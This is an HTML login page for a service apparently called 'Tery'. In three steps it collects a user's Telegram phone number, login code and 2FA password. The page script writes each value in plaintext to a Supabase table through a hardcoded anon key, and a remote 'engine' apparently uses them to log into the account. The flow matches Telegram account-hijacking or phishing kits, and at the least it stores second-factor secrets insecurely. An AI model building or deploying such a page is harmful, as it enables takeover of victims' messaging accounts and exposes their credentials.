<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tery | Login</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
</head>
<body class="bg-gray-900 text-white font-sans antialiased flex items-center justify-center min-h-screen">

    <div class="bg-gray-800 border border-gray-700 rounded-2xl p-8 shadow-2xl w-full max-w-md text-center">
        <h1 class="text-4xl font-bold text-blue-500 mb-2">Tery.</h1>
        <p id="status-text" class="text-gray-400 mb-8">Enter your Telegram number to connect.</p>
        
        <div id="phone-step" class="space-y-4">
            <input type="text" id="phone_input" placeholder="+1234567890" class="w-full bg-gray-900 border border-gray-600 rounded-lg px-4 py-3 text-white focus:outline-none focus:border-blue-500">
            <button onclick="sendPhone()" class="w-full bg-blue-600 hover:bg-blue-500 text-white font-bold py-3 rounded-lg shadow-lg transition">Get Login Code</button>
        </div>

        <div id="code-step" class="hidden space-y-4">
            <input type="text" id="code_input" placeholder="12345" class="w-full bg-gray-900 border border-gray-600 rounded-lg px-4 py-3 text-white focus:outline-none focus:border-blue-500">
            <button onclick="verifyCode()" class="w-full bg-blue-600 hover:bg-blue-500 text-white font-bold py-3 rounded-lg shadow-lg transition">Verify Code</button>
        </div>

        <div id="password-step" class="hidden space-y-4">
            <input type="password" id="password_input" placeholder="Your 2FA Password" class="w-full bg-gray-900 border border-gray-600 rounded-lg px-4 py-3 text-white focus:outline-none focus:border-blue-500">
            <button onclick="verifyPassword()" class="w-full bg-blue-600 hover:bg-blue-500 text-white font-bold py-3 rounded-lg shadow-lg transition">Finalize Login</button>
        </div>
    </div>

    <script>
        const supabaseClient = supabase.createClient('https://nxhejhicpoztowqfdpkm.supabase.co', 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im54aGVqaGljcG96dG93cWZkcGttIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzUxOTc0MDEsImV4cCI6MjA5MDc3MzQwMX0.rcuC47r-boezsmQUzaARCT5HPPgg-Ghjo4BXEAnVdNo');
        let currentRequestId = null;

        async function sendPhone() {
            const phone = document.getElementById('phone_input').value;
            if(!phone) return alert("Please enter a valid phone number.");

            const { data, error } = await supabaseClient.from('login_requests').insert([{ phone_number: phone, status: 'pending' }]).select();
            if(error) return alert("Error: " + error.message);

            currentRequestId = data[0].id;
            document.getElementById('phone-step').classList.add('hidden');
            document.getElementById('status-text').innerText = "Connecting to engine...";
            startListening();
        }

        function startListening() {
            supabaseClient.channel('login-channel').on('postgres_changes', { 
                event: 'UPDATE', schema: 'public', table: 'login_requests', filter: `id=eq.${currentRequestId}` 
            }, (payload) => {
                const status = payload.new.status;
                if (status === 'awaiting_code') { 
                    document.getElementById('code-step').classList.remove('hidden');
                    document.getElementById('status-text').innerText = "Enter the code sent to your Telegram app.";
                } else if (status === 'awaiting_password') { 
                    document.getElementById('code-step').classList.add('hidden');
                    document.getElementById('password-step').classList.remove('hidden');
                    document.getElementById('status-text').innerText = "2FA Password Required.";
                } else if (status === 'success') { 
                    localStorage.setItem('tery_uid', payload.new.user_id);
                    window.location.href = 'dashboard.html'; 
                } else if (status === 'error') {
                    alert("Login failed. Please refresh and try again.");
                    location.reload();
                }
            }).subscribe();
        }

        async function verifyCode() {
            document.getElementById('status-text').innerText = "Verifying...";
            await supabaseClient.from('login_requests').update({ telegram_code: document.getElementById('code_input').value, status: 'code_submitted' }).eq('id', currentRequestId);
        }

        async function verifyPassword() {
            document.getElementById('status-text').innerText = "Logging in...";
            await supabaseClient.from('login_requests').update({ two_fa_password: document.getElementById('password_input').value, status: 'password_submitted' }).eq('id', currentRequestId);
        }
    </script>
</body>
</html>
